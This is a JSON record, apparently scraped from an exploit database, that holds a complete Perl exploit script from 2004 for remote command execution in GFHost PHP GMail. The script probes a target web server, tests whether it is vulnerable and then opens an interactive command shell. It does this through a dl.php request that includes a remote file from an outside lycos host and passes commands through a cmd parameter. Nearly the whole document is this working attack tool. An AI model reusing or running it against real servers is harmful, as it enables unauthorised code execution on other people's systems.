{
  "id": "645",
  "title": "GFHost PHP GMail - Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "##############################################\r\n# GFHost explo\r\n# Spawn bash style Shell with webserver uid\r\n# Greetz SPAX, foxtwo, Zone-H\r\n# This Script is currently under development\r\n##############################################\r\n\r\nuse strict;\r\nuse IO::Socket;\r\nmy $host;  \r\nmy $port;  \r\nmy $command;  \r\nmy $url; \r\nmy @results;  \r\nmy $probe;  \r\nmy @U;   \r\n$U[1] = \"/dl.php?a=0.1&OUR_FILE=ff24404eeac528b&f=http://utenti.lycos.it/z00/xpl.gif&cmd=\";\r\n&intro;\r\n&scan;\r\n&choose;\r\n&command;\r\n&exit; \r\nsub intro {\r\n&help;\r\n&host;\r\n&server;\r\nsleep 1;\r\n};\r\nsub host {\r\nprint \"\\nHost or IP : \";\r\n$host=<STDIN>;\r\nchomp $host;\r\nif ($host eq \"\"){$host=\"127.0.0.1\"};\r\nprint \"\\nPort (enter to accept 80): \";\r\n$port=<STDIN>;\r\nchomp $port;\r\nif ($port =~/\\D/ ){$port=\"80\"};\r\nif ($port eq \"\" ) {$port = \"80\"};\r\n}; \r\nsub server {\r\nmy $X;\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n$probe = \"string\";\r\nmy $output;\r\nmy $webserver = \"something\";\r\n&connect;\r\nfor ($X=0; $X<=10; $X++){\r\n $output = $results[$X];\r\n if (defined $output){\r\n if ($output =~/apache/){ $webserver = \"apache\" };\r\n };\r\n};\r\nif ($webserver ne \"apache\"){\r\nmy $choice = \"y\";\r\nchomp $choice;\r\nif ($choice =~/N/i) {&exit};\r\n            }else{\r\nprint \"\\n\\nOK\";\r\n };  \r\n};  \r\nsub scan {\r\nmy $status = \"not_vulnerable\";\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\nmy $loop;\r\nmy $output;\r\nmy $flag;\r\n$command=\"dir\";\r\nfor ($loop=1; $loop < @U; $loop++) { \r\n$flag = \"0\";\r\n$url = $U[$loop];\r\n$probe = \"scan\";\r\n&connect;\r\nforeach $output (@results){\r\nif ($output =~ /Directory/) {\r\n                              $flag = \"1\";\r\n         $status = \"vulnerable\";\r\n         };\r\n };\r\nif ($flag eq \"0\") { \r\n}else{\r\n     };\r\n};\r\nif ($status eq \"not_vulnerable\"){\r\n\r\n    };\r\n}; \r\nsub choose {\r\n\r\nmy $choice=\"1\";\r\nchomp $choice;\r\nif ($choice > @U){ &choose };\r\nif ($choice =~/\\D/g ){ &choose };\r\nif ($choice == 0){ &other };\r\n$url = $U[$choice];\r\n}; \r\nsub other {\r\nmy $other = <STDIN>;\r\nchomp $other;\r\n$U[0] = $other;\r\n};  \r\nsub command {\r\nwhile ($command !~/quit/i) {\r\nprint \"[$host]\\$ \";\r\n$command = <STDIN>;\r\nchomp $command;\r\nif ($command =~/quit/i) { &exit };\r\nif ($command =~/url/i) { &choose }; \r\nif ($command =~/scan/i) { &scan };\r\nif ($command =~/help/i) { &help };\r\n$command =~ s/\\s/+/g; \r\n$probe = \"command\";\r\nif ($command !~/quit|url|scan|help/) {&connect};\r\n};\r\n&exit;\r\n};  \r\nsub connect {\r\nmy $connection = IO::Socket::INET->new (\r\n    Proto => \"tcp\",\r\n    PeerAddr => \"$host\",\r\n    PeerPort => \"$port\",\r\n    ) or die \"\\nSorry UNABLE TO CONNECT To $host On Port $port.\\n\";\r\n$connection -> autoflush(1);\r\nif ($probe =~/command|scan/){\r\nprint $connection \"GET $url$command HTTP/1.1\\r\\nHost: $host\\r\\n\\r\\n\";\r\n}elsif ($probe =~/string/) {\r\nprint $connection \"HEAD / HTTP/1.1\\r\\nHost: $host\\r\\n\\r\\n\";\r\n};\r\n\r\nwhile ( <$connection> ) { \r\n   @results = <$connection>;\r\n    };\r\nclose $connection;\r\nif ($probe eq \"command\"){ &output };\r\nif ($probe eq \"string\"){ &output };\r\n};  \r\nsub output{\r\nmy $display;\r\nif ($probe eq \"string\") {\r\n   my $X;\r\n   for ($X=0; $X<=10; $X++) {\r\n   $display = $results[$X];\r\n   if (defined $display){print \"$display\";};\r\n    };\r\n   }else{\r\n   foreach $display (@results){\r\n       print \"$display\";\r\n    };\r\n                          };\r\n};  \r\nsub exit{\r\nprint \"\\n\\n\\n ORP\";\r\nexit;\r\n};\r\nsub help {\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\nprint \"\\n\r\n        GFHost PHP GMail \r\n        Command Execution Vulnerability by SPABAM 2004\" ;\r\nprint \"\\n http://www.zone-h.org/advisories/read/id=4904\r\n\";\r\nprint \"\\n GFHost.pl Exploit v1.1\";\r\nprint \"\\n \\n note.. Script under DEVEL\";\r\nprint \"\\n\";\r\nprint \"\\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)\";\r\nprint \"\\n Command: SCAN URL HELP QUIT\";\r\nprint \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\";\r\n};\r\n\r\n# milw0rm.com [2004-11-21]",
  "url": "https://www.exploit-db.com/exploits/645"
}